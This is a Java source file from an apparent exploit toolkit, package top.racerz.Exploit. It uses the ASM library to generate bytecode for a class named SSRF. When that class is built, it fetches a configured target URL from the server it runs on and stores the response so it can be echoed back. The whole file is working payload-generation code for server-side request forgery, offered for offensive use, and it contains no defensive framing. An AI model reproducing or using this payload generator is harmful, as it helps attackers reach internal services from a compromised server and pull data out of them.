package top.racerz.Exploit;

import org.objectweb.asm.*;
import top.racerz.utils.StringUtil;

public class SSRF implements Opcodes {

    public static void insert(ClassWriter cw) {
        String target = StringUtil.getCurrentPropertiesValue("SSRF");

        FieldVisitor fv;
        MethodVisitor mv;

        {
            fv = cw.visitField(ACC_PRIVATE, "result", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            Label l1 = new Label();
            Label l2 = new Label();
            mv.visitTryCatchBlock(l0, l1, l2, "java/lang/Exception");
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(12, l3);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            mv.visitLabel(l0);
            mv.visitLineNumber(14, l0);
            mv.visitLdcInsn(target);
            mv.visitVarInsn(ASTORE, 1);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(15, l4);
            mv.visitTypeInsn(NEW, "java/net/URL");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitMethodInsn(INVOKESPECIAL, "java/net/URL", "<init>", "(Ljava/lang/String;)V", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(17, l5);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/URL", "openConnection", "()Ljava/net/URLConnection;", false);
            mv.visitTypeInsn(CHECKCAST, "java/net/HttpURLConnection");
            mv.visitVarInsn(ASTORE, 3);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(18, l6);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setDoOutput", "(Z)V", false);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(19, l7);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitLdcInsn("GET");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestMethod", "(Ljava/lang/String;)V", false);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(20, l8);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitLdcInsn("Content-Type");
            mv.visitLdcInsn("application/x-www-form-urlencoded; charset=UTF-8");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "setRequestProperty", "(Ljava/lang/String;Ljava/lang/String;)V", false);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(22, l9);
            mv.visitTypeInsn(NEW, "java/io/BufferedReader");
            mv.visitInsn(DUP);
            mv.visitTypeInsn(NEW, "java/io/InputStreamReader");
            mv.visitInsn(DUP);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "getInputStream", "()Ljava/io/InputStream;", false);
            mv.visitFieldInsn(GETSTATIC, "java/nio/charset/StandardCharsets", "UTF_8", "Ljava/nio/charset/Charset;");
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/InputStreamReader", "<init>", "(Ljava/io/InputStream;Ljava/nio/charset/Charset;)V", false);
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/BufferedReader", "<init>", "(Ljava/io/Reader;)V", false);
            mv.visitVarInsn(ASTORE, 4);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(23, l10);
            mv.visitTypeInsn(NEW, "java/lang/StringBuilder");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            mv.visitVarInsn(ASTORE, 5);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(26, l11);
            mv.visitFrame(Opcodes.F_FULL, 6, new Object[]{"SSRF", "java/lang/String", "java/net/URL", "java/net/HttpURLConnection", "java/io/BufferedReader", "java/lang/StringBuilder"}, 0, new Object[]{});
            mv.visitVarInsn(ALOAD, 4);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/BufferedReader", "readLine", "()Ljava/lang/String;", false);
            mv.visitInsn(DUP);
            mv.visitVarInsn(ASTORE, 6);
            Label l12 = new Label();
            mv.visitLabel(l12);
            Label l13 = new Label();
            mv.visitJumpInsn(IFNULL, l13);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(27, l14);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitVarInsn(ALOAD, 6);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitLdcInsn("\n");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            mv.visitInsn(POP);
            mv.visitJumpInsn(GOTO, l11);
            mv.visitLabel(l13);
            mv.visitLineNumber(30, l13);
            mv.visitFrame(Opcodes.F_APPEND, 1, new Object[]{"java/lang/String"}, 0, null);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/HttpURLConnection", "disconnect", "()V", false);
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(31, l15);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/String", "valueOf", "(Ljava/lang/Object;)Ljava/lang/String;", false);
            mv.visitFieldInsn(PUTFIELD, "SSRF", "result", "Ljava/lang/String;");
            mv.visitLabel(l1);
            mv.visitLineNumber(35, l1);
            Label l16 = new Label();
            mv.visitJumpInsn(GOTO, l16);
            mv.visitLabel(l2);
            mv.visitLineNumber(33, l2);
            mv.visitFrame(Opcodes.F_FULL, 1, new Object[]{"SSRF"}, 1, new Object[]{"java/lang/Exception"});
            mv.visitVarInsn(ASTORE, 1);
            Label l17 = new Label();
            mv.visitLabel(l17);
            mv.visitLineNumber(34, l17);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitLdcInsn("\u672a\u6210\u529f\u8fd4\u56de\u5185\u5bb9\uff01");
            mv.visitFieldInsn(PUTFIELD, "SSRF", "result", "Ljava/lang/String;");
            mv.visitLabel(l16);
            mv.visitLineNumber(38, l16);
            mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "SSRF", "echo", "()V", false);
            Label l18 = new Label();
            mv.visitLabel(l18);
            mv.visitLineNumber(39, l18);
            mv.visitInsn(RETURN);
            Label l19 = new Label();
            mv.visitLabel(l19);
            mv.visitLocalVariable("target", "Ljava/lang/String;", null, l4, l1, 1);
            mv.visitLocalVariable("url", "Ljava/net/URL;", null, l5, l1, 2);
            mv.visitLocalVariable("connection", "Ljava/net/HttpURLConnection;", null, l6, l1, 3);
            mv.visitLocalVariable("buffer", "Ljava/io/BufferedReader;", null, l10, l1, 4);
            mv.visitLocalVariable("result", "Ljava/lang/StringBuilder;", null, l11, l1, 5);
            mv.visitLocalVariable("line", "Ljava/lang/String;", null, l12, l1, 6);
            mv.visitLocalVariable("e", "Ljava/lang/Exception;", null, l17, l16, 1);
            mv.visitLocalVariable("this", "LSSRF;", null, l3, l19, 0);
            mv.visitMaxs(6, 7);
            mv.visitEnd();
        }
    }
}
